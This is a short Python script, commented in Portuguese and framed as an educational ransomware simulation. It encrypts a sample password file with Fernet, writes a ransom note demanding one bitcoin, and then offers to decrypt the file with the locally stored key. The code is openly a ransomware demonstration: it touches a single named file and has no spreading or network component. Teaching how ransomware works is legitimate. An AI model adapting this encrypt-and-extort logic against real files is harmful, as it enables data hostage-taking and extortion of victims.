from cryptography.fernet import Fernet
import os
import threading

# Nome do arquivo de teste e da chave
ARQUIVO_ALVO = "senhas.txt"
ARQUIVO_CHAVE = "chave.key"
ARQUIVO_RESGATE = "LEIA_ISSO.txt"

def carregar_ou_gerar_chave():
    """Gera uma nova chave ou carrega uma existente para permitir a reversão [2, 4]."""
    if not os.path.exists(ARQUIVO_CHAVE):
        chave = Fernet.generate_key()
        with open(ARQUIVO_CHAVE, "wb") as key_file:
            key_file.write(chave)
        return chave
    with open(ARQUIVO_CHAVE, "rb") as key_file:
        return key_file.read()

def manipular_arquivo(nome_arquivo, fernet_inst, modo="enc"):
    """Criptografa ou descriptografa o arquivo alvo [1, 2]."""
    if not os.path.exists(nome_arquivo):
        print(f"Erro: Arquivo {nome_arquivo} não encontrado.")
        return

    with open(nome_arquivo, "rb") as f:
        conteudo = f.read()

    if modo == "enc":
        # Transforma o conteúdo em dados de alta entropia [3]
        novo_conteudo = fernet_inst.encrypt(conteudo)
        acao = "Criptografado"
    else:
        # Reverte o processo usando a mesma chave simétrica [2]
        novo_conteudo = fernet_inst.decrypt(conteudo)
        acao = "Descriptografado"

    with open(nome_arquivo, "wb") as f:
        f.write(novo_conteudo)
    print(f"Sucesso: Arquivo {nome_arquivo} {acao}.")

def gerar_mensagem_resgate():
    """Gera a mensagem de resgate simulando o dano imediato de um malware [5]."""
    mensagem = """Seus arquivos foram criptografados!
Envia 1 bitcoin para o endereço X e envie o comprovante!
Depois disso, enviaremos a chave para você recuperar seus dados!"""
    with open(ARQUIVO_RESGATE, "w") as f:
        f.write(mensagem)
    
    # Exemplo opcional: usar um Timer para exibir a mensagem repetidamente [6]
    print(f"Verifique '{ARQUIVO_RESGATE}' para instruções.")

# Execução do Ciclo Educacional
if __name__ == "__main__":
    # 1. Preparação
    minha_chave = carregar_ou_gerar_chave()
    fernet = Fernet(minha_chave)

    # 2. Simulação de Ataque (Criptografia) [5, 7]
    if not os.path.exists(ARQUIVO_ALVO):
        with open(ARQUIVO_ALVO, "w") as f: f.write("senha123\nadmin456")
    
    manipular_arquivo(ARQUIVO_ALVO, fernet, modo="enc")
    gerar_mensagem_resgate()

    # 3. Simulação de Recuperação (Descriptografia) [2]
    # Em um cenário real, isso ocorreria após a obtenção da chave
    resposta = input("\nDeseja descriptografar o arquivo agora? (s/n): ")
    if resposta.lower() == 's':
        manipular_arquivo(ARQUIVO_ALVO, fernet, modo="dec")
